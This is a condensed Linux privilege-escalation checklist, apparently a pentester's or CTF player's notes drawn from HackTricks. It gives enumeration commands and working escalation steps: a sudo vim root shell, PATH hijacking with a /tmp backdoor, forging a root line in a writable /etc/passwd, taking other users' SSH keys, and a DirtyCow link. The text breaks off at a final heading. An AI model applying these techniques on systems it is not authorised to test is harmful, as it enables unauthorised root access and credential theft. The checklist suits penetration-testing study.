# Linux Privilege Escalation

Condensed version of the checklist found on [Hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation). There is a plethora of ways to escalate privileges but I'm going to list the most common ways to escalate privileges (In my experience) 

## System Information

### Path
Check for write permissions on any folder within your PATH. Potential to hijack libraries or binaries.
```bash
echo $PATH
```

### Kernel Exploits
Check the OS and kernel version for potential exploits
```
cat /etc/issue
uname -a
```

### CVE-2016-5195 (DirtyCow)
Impacts Linux kernel versions <4.8.3
```
https://github.com/exrienz/DirtyCow
```

### Sudo
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Check for compiler
It's always best to try and compile exploits on the target machine. This reduces the chance of error from being compiled on a different architecture.
```bash
dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/"
```
### Installed Software
Find software installed on the machine along with its version. Might find some old software that has a vulnerability.
```bash
dpkg -l #Debian-based
rpm -qa #Centos-based
```

### Running processes
```
ps aux
```

## Users
### Standard Enumeration
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
```

### Sudo/SUID
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```


### NOPASSWD
With this permission, the user can run a specific command (or any) as another user without knowing the password.
```bash
$ sudo -l

User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```
Here the user demo can run the vim command as the root user. We could get a root shell by executing the following:
```bash
sudo vim -c '!sh'
```

### Sudo/SUID w/o command path
If the user has sudo permission for a command without specifying its path (i.e *randomuser ALL = (root) less*), it can be exploited by changing the PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

### GTFOBins
[GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. With these you can break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and lots of other things.

__NOTE__: [FallofSudo](https://github.com/Critical-Start/FallofSudo) can help exploit permissions from `sudo -l`

## SSH
### Config Values
SSH configuration files are typically either /etc/ssh/ssh_config or /etc/ssh/sshd_config. Within these files you may find some interesting values:
```
PasswordAuthentication: Specifies whether password authentication is allowed. The default is no.
PubkeyAuthentication: Specifies whether public key authentication is allowed. The default is yes.
PermitEmptyPasswords: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is no.
```

### PermitRootLogin
Specifies whether root can log in using ssh, default is no. Possible values:
* `yes` : root can login using password and private key
* `without-password` or `prohibit-password`: root can only login with private key
* `forced-commands-only`: Root can login only using privatekey cand if the commands options is specified
* `no` : no

### AuthorizedKeysFile
Sometimes you may be able to obtain the private ssh key of another, more privileged user. This will enable you to ssh in as that user without knowing their password. This key file `id_rsa` will usually be located in the `/home/{USER}/.ssh` directory.

## Interesting Files
### Writeable /etc/passwd
If `/etc/passwd` is writable, you can easily create a user with root privileges.
```
perl -e 'print crypt("{PASSWOR}", "{SALT}"),"\n"'
```
Then add the user and generated password to the file
```
USER_HERE:GENERATED_PASSWORD_HERE:0:0:root:/root:/bin/bash
```

### Writing to a sensitive file
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

### Backup files
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/nulll
```

### Python library hijacking